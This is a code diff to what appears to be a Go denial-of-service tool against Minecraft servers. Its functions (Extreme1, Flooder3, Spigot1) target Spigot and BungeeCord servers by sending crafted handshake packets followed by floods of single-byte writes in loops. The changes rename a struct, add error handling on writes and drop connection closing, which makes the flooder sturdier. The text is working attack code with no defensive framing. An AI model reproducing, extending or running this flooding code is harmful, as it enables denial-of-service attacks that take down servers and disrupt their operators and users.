@@ -31,8 +31,8 @@ func makeBytes(data ...interface{}) []byte {
 	return bytes
 }
 
-// MethodData is used as an argument for functions below
-type MethodData struct {
+// Data is used as an argument for functions below
+type Data struct {
 	Address string
 	Loop    int
 	bytes   []byte
@@ -41,7 +41,7 @@ type MethodData struct {
 }
 
 //Extreme1 is for spigot based servers
-func Extreme1(data *MethodData, out net.Conn) {
+func Extreme1(data *Data, out net.Conn) bool {
 	if data.bytes == nil {
 		data.bytes = makeBytes(15, 0, 99, 453, data.Address, 457, 1)
 		data.one = makeBytes(1)
@@ -51,7 +51,11 @@ func Extreme1(data *MethodData, out net.Conn) {
 	fmt.Println("sent")
 
 	for i := 0; i < data.Loop; i++ {
-		out.Write(data.bytes)
+		_, err := out.Write(data.bytes)
+
+		if err != nil {
+			return true
+		}
 
 		for n := 0; n < 1900; n++ {
 			out.Write(data.one)
@@ -59,11 +63,11 @@ func Extreme1(data *MethodData, out net.Conn) {
 		}
 	}
 
-	out.Close()
+	return false
 }
 
 // Flooder3 is used to attack BungeeCord
-func Flooder3(data *MethodData, out net.Conn) {
+func Flooder3(data *Data, out net.Conn) bool {
 	if data.bytes == nil {
 		data.bytes = makeBytes(0, 47, 20, 109, data.Address, 99, 45, 50, 50, 55, 55, 46, 114, 97, 122, 105, 120, 112, 118, 112, 46, 100, 101, 46, 99, -35, 2)
 		data.one = makeBytes(1)
@@ -73,7 +77,11 @@ func Flooder3(data *MethodData, out net.Conn) {
 	fmt.Println("sent")
 
 	for i := 0; i < data.Loop; i++ {
-		out.Write(data.bytes)
+		_, err := out.Write(data.bytes)
+
+		if err != nil {
+			return true
+		}
 
 		for n := 0; n < 1900; n++ {
 			out.Write(data.one)
@@ -81,11 +89,11 @@ func Flooder3(data *MethodData, out net.Conn) {
 		}
 	}
 
-	out.Close()
+	return false
 }
 
 // Spigot1 is for spigot o_O
-func Spigot1(data *MethodData, out net.Conn) {
+func Spigot1(data *Data, out net.Conn) {
 	if data.bytes == nil {
 		data.bytes = makeBytes(15, 0, 47, 9, data.Address, 99, 224, 1)
 		data.one = makeBytes(1)
@@ -102,6 +110,4 @@ func Spigot1(data *MethodData, out net.Conn) {
 			out.Write(data.zero)
 		}
 	}
-
-	out.Close()
 }
